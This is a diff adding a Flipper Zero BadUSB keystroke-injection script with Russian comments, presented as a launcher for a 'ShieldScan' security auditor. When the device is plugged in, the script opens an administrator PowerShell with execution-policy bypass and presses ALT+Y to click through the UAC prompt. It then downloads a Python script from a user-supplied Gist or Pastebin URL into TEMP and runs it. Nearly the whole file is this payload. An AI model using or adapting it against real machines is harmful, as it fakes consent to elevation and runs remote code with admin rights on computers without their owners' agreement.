@@ -1,0 +1,32 @@
+REM ═══════════════════════════════════════════════════
+REM   ShieldScan BadUSB Launcher v2 (Python)
+REM   Скачивает и запускает через Python
+REM ═══════════════════════════════════════════════════
+REM
+REM   Этот вариант НЕ требует отдельной флешки!
+REM   Но на ПК должен быть установлен Python.
+REM
+REM   Как использовать:
+REM   1. Залей security_auditor.py на свой сервер,
+REM      GitHub Gist или Pastebin (raw-ссылка)
+REM   2. Замени URL_СКРИПТА ниже на свою ссылку
+REM   3. Положи этот .txt на SD Flipper: /badusb/
+REM   4. Подключи Flipper → BadUSB → запусти
+REM ═══════════════════════════════════════════════════
+
+DELAY 1000
+
+REM ── Открываем PowerShell от администратора ──
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass'"
+ENTER
+
+REM Ждём UAC
+DELAY 2500
+ALT y
+DELAY 1500
+
+REM ── Устанавливаем rich и скачиваем скрипт ──
+STRING pip install rich --quiet 2>$null; $url = 'URL_СКРИПТА'; $out = "$env:TEMP\shieldscan.py"; Invoke-WebRequest -Uri $url -OutFile $out; python $out; Read-Host 'Нажмите Enter для выхода'
+ENTER
